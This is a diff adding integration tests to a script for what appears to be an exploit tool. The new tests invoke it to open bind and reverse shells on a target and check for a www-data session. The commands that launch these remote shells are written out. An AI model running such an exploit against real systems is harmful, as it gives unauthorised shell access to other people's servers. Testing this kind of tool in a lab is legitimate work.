@@ -67,4 +67,19 @@ echo "$BIND_OUT" | grep -q "id says: uid=33(www-data)" \
   || fail "bind shell did not yield a www-data session"
 echo "OK: bind shell session verified"
 
+echo "== exploit: zero-setup bind shell (no serve/lhost flags) =="
+BIND_OUT=$(python3 run.py --target "$TARGET" --exploit 2>&1 || true)
+echo "$BIND_OUT"
+echo "$BIND_OUT"
+echo "$BIND_OUT" | grep -q "id says: uid=33(www-data)" \
+  || fail "zero-setup bind shell did not yield a www-data session"
+echo "OK: zero-setup bind shell verified"
+
+echo "== exploit: zero-setup reverse shell (auto-served, auto-caught) =="
+REV_OUT=$(python3 run.py --target "$TARGET" --exploit --lhost 127.0.0.1 --lport 4456 2>&1 || true)
+echo "$REV_OUT"
+echo "$REV_OUT" | grep -q "uid=33(www-data)" \
+  || fail "reverse shell did not yield a www-data session"
+echo "OK: reverse shell session verified"
+
 echo "== all integration tests passed =="
